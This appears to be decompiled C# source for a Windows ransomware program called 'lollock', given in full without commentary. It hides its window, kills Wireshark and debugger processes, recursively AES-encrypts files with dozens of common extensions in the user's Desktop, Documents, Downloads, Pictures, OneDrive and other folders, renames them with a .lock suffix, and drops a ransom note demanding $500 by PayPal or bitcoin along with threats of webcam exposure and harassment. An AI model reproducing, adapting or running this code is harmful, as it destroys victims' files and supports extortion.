using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace lollock;

public class Form1 : Form
{
	private string targetURL = "http://127.0.0.1/Server/write.php";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private IContainer components;

	private TextBox textBox1;

	private NotifyIcon notifyIcon1;

	private Label label1;

	private ListBox listBox1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Button button1;

	private Button button2;

	private CheckBox checkBox1;

	private CheckBox checkBox2;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C taskkill /f /im wireshark.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C taskkill /f /im debugger.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		string text = CreatePassword2(5);
		((Control)label3).set_Text(text);
		listBox1.get_Items().Add((object)"lyricransome@airmail.cc ");
		int num = new Random().Next(listBox1.get_Items().get_Count());
		((Control)label1).set_Text(listBox1.get_Items().get_Item(num).ToString());
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public string CreatePassword2(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp0987654321"[random.Next("QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp0987654321".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			((Control)label2).set_Text(password);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\" + userName + "\\Desktop\\readme_lock.txt.lock";
		string path = userDir + text;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".lock");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[40]
			{
				".txt", ".jar", ".7z", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx",
				".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".php", ".html",
				".htm", ".xml", ".pdf", ".mp3", ".mp4", ".zip", ".rar", ".rtf", ".bmp", ".psd",
				".bz2", ".gzip", ".tar", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".db", ".torrent"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void startAction()
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = CreatePassword(20);
		Directory_Settings_Sending(text);
		SendPassword(text);
		messageCreator();
		((Control)label2).set_Text(text);
		SendPassword(text);
		text = null;
		notifyIcon1.set_Visible(true);
		notifyIcon1.set_BalloonTipTitle("RANSOEM");
		notifyIcon1.set_BalloonTipText("your system locked");
		notifyIcon1.ShowBalloonTip(60000);
		string text2 = "\\Desktop\\readme_lock.txt";
		_ = userDir + "Users\\" + userName + text2;
		_ = computerName + "-" + userName;
		((Form)new Form2()).ShowDialog();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Links";
		string location3 = userDir + text + userName + "\\Contacts";
		string location4 = userDir + text + userName + "\\Desktop";
		string location5 = userDir + text + userName + "\\Documents";
		string location6 = userDir + text + userName + "\\Downloads";
		string location7 = userDir + text + userName + "\\Pictures";
		string location8 = userDir + text + userName + "\\Music";
		string location9 = userDir + text + userName + "\\OneDrive";
		string location10 = userDir + text + userName + "\\Saved Games";
		string location11 = userDir + text + userName + "\\Favorites";
		string location12 = userDir + text + userName + "\\Searches";
		string location13 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\readme_lock.txt";
		string path = userDir + "Users\\" + userName + text;
		_ = computerName + "-" + userName;
		string[] contents = new string[28]
		{
			"LOCKED BY A  RANSOMWAR, you have infected.............",
			"maybe you not careful and open virusnow",
			"you system, file encyrpted it.",
			"file with encrypting the milithary algoritmm.",
			"the algorithm strong, cannot decrypt without my key worse than wannacry",
			"want to re cover your file ok",
			"there is simple salutations do",
			"lets say you want maoney i can decrypt your session key",
			"i know my friend teaches my programming skill and with package i could lock you",
			"only my friend can help yeah i know not key but he know.",
			"anyway he asked for $500 through paypal friends and family i know he is honest",
			"you have paypel or bitcoin but teach us how to use bitcoins can send us mail at the " + ((Control)label1).get_Text(),
			"  we set the id up for you its: " + ((Control)label3).get_Text() + ((Control)label2).get_Text(),
			" there is not secret on this id do not search ot online",
			"we need to get money fast and escape our world yeah its only way encryopt you",
			"if you wonder how we are then pay first and we tell you",
			"but really if you not pay we are bored maybe we delete some file or open annoying stuff in your system like extra hackers",
			"we also know your ip address that mights no i where you live thats send mail with ransom note in your box",
			"if you not paying we might even cost your anyway we can send pizza deliver on phone and more",
			"we can also show your webcam on internet really you might look funny ok",
			"lol ok but we are really want money so pay us now ok",
			"yeah i think you know i you want to pay us now frough paypal friends and family email us now or ",
			"else system will be rined and your life too",
			"you cannot replay live you are choose wisely or might the VIRUS hurt you pc more",
			"warning do not rpeort to the police or fbi or cia but you know we are from other country",
			"you cannot hurt us ransom by the hack us email because we dont care",
			"our paypal is not lockedble because we know wen you are encrypted secrety",
			"do not try spam our email  or we send pizza or uber ride to addres"
		};
		File.WriteAllLines(path, contents);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		textBox1 = new TextBox();
		notifyIcon1 = new NotifyIcon(components);
		label1 = new Label();
		listBox1 = new ListBox();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		button1 = new Button();
		button2 = new Button();
		checkBox1 = new CheckBox();
		checkBox2 = new CheckBox();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Location(new Point(100, 60));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(100, 20));
		((Control)textBox1).set_TabIndex(0);
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("Notification");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(100, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("label1");
		((ListControl)listBox1).set_FormattingEnabled(true);
		((Control)listBox1).set_Location(new Point(230, 8));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(120, 95));
		((Control)listBox1).set_TabIndex(2);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(103, 41));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(35, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("label2");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(13, 90));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(35, 13));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("label3");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(76, 90));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(35, 13));
		((Control)label4).set_TabIndex(5);
		((Control)label4).set_Text("label4");
		((Control)button1).set_Location(new Point(0, 0));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button2).set_Location(new Point(8, 8));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(7);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(16, 16));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(80, 17));
		((Control)checkBox1).set_TabIndex(8);
		((Control)checkBox1).set_Text("checkBox1");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((Control)checkBox2).set_AutoSize(true);
		((Control)checkBox2).set_Location(new Point(24, 24));
		((Control)checkBox2).set_Name("checkBox2");
		((Control)checkBox2).set_Size(new Size(80, 17));
		((Control)checkBox2).set_TabIndex(9);
		((Control)checkBox2).set_Text("checkBox2");
		((ButtonBase)checkBox2).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(430, 115));
		((Control)this).get_Controls().Add((Control)(object)checkBox2);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Control)this).set_Text("aseiotjtjtjtjtjtjtjtjtjtjtjtjtjtjasssssssssssssssjio");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
